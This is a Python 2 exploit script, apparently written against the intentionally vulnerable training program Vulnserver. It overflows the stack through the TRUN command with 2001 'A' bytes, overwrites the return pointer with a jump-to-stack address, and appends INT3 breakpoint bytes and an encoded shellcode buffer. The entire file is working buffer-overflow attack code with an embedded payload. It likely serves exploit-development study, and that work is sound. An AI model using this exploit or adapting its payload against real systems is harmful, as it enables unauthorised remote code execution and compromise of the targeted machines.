#!/usr/bin/python
import socket
server = '192.168.43.181'
sport = 9999

buf =  ""
buf += "\xda\xd3\xba\x78\x35\xa7\x73\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x61\x83\xc6\x04\x31\x56\x16\x03\x56\x16\xe2"
buf += "\x8d\xec\x6d\xcb\x4e\xa8\x1d\xe7\x49\xc2\xc5\x03\x32"
buf += "\x18\xcf\x5d\x9f\x6f\x8c\x8a\x9c\x7b\xee\xb6\xc2\xcf"
buf += "\x82\x87\xde\x31\x7f\x32\x6d\x9d\xa0\xa2\x56\xaa\x4a"
buf += "\x1c\x4e\xef\x16\x34\x07\x67\x4c\x18\x08\xf0\x74\x09"
buf += "\xd6\x09\x65\x5b\xdf\x18\x81\x9e\x8d\x8c\x14\xe8\x3b"
buf += "\x7c\x73\x6f\x81\x34\xba\x44\x6b\x60\x27\xfb\xf2\xdb"
buf += "\x52\x73\x61\x84\x78\xb4\xa5\x79\xcc\x53\x92\xdc\x8b"
buf += "\xd4\xdb\xe8\xdc\xff\xf1\xce\xd4\x93\x07\xac\xfe\x9a"
buf += "\xb6\x96\x71\x4b\x4a\x66\xa9\x56\x39\x5c\x21\xe9\x32"
buf += "\xc4\x2c\xd9\x2a\xf5\x1c\x7d\x64\x9e\x04\xb4\xaa\x6e"
buf += "\xe5\x7e\xd5\x07\xc5\x4f\x0c\xc4\x72\xa3\xcb\x72\x79"
buf += "\x95\x79\x14\xc2\xa0\x4b\xac\xf5\xe0\x41\x35\xfa\xb2"
buf += "\x2a\x3b\x1e\x6b\x22\x15\xeb\x94\x3f\xee\xda\xcf\xa3"
buf += "\xaf\x76\xb8\xed\xc0\x05\xe8\x26\xfb\xea\xef\x20\xe3"
buf += "\x54\xff\xa6\xf5\x7f\xa4\xfc\xb7\xb4\xea\x7a\xac\xa3"
buf += "\x6e\xb8\x9a\x17\x52\x84\x49\xeb\xb0\xee\x8f\xd7\x34"
buf += "\xa5\xf7\xe5\xd0\xa6\x60\xb4\x25\x75\x52\x53\xf6\x07"
buf += "\x8b\x79\x34\xff\xba\x7f\x37\xb5\xe1\xf8\x85\x3c\x87"
buf += "\xaf\x81\x09\xba\x56\x4f\xa2\x96\xcd\xdb\x4b\xac\xdb"
buf += "\xa4\x4c\xf0\x2a\x4d\xf5\x45\x51\xc0\xbc\xfa\x47\x63"
buf += "\x7d\x4a\x22\x09\x99\x49\xe8\xcd\x0c\x29\x10\x94\xc2"
buf += "\x81\xb5\xe4\x45\xcb\xf1\x6d\xa7\xea\x90\xe4\xf2\x7d"
buf += "\x64\x1e\x9e\x7e\xc0\xee\x8a\x6d\xc7\xbe\x50\x03\xd5"
buf += "\x28\x8e\x5e\x9d\x72\x08\x3d\xd9\xc2\x28\xb2\x28\x80"
buf += "\xda\x3c\x69\xae\x05\xe5\x64\x48\x25\xf2\xee\xa0\xb3"
buf += "\xe9\xe6\x82\xff\x48\x65\x7d\xc6\x7e\x68\x9e\x16\x6d"
buf += "\x6d\x8f\x21\xfd\x47\x58\x5d\xcb\xe6\x0b\xdb\x4b\xc0"
buf += "\x38\x46\x31\x48\x80\xb4\x54\x47\x6f\xa6\x5e\xaa\xcc"
buf += "\x6e\x2b\xd1\x6d\x17\xd6\x36\xb0\x4c\x85\x66\xba\x52"
buf += "\x0f\xdc\x68\x82\x7b\x5d\x6b\xd6\xaa\xaf\x50"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

print ('Commands: STATS, RTIME, LTIME, SRUN, ' +
   'TRUN, GMON, GDOG, KSTET, GTER, HTER, LTER, KSTAN')
print
#cmd = raw_input('Command: ')
#l0 = int(raw_input('Start length: '))
#lstep = int(raw_input('Length step: '))
cmd='TRUN .' 


eip = '\xaf\x11\x50\x62'
np = '\x90\x90\x90\x90'
interrupt = '\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC'
print "Sending attack to ", cmd, " A * "
attack = 'A'*2001+'1111'+eip+interrupt+buf
s.send((cmd + ' ' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
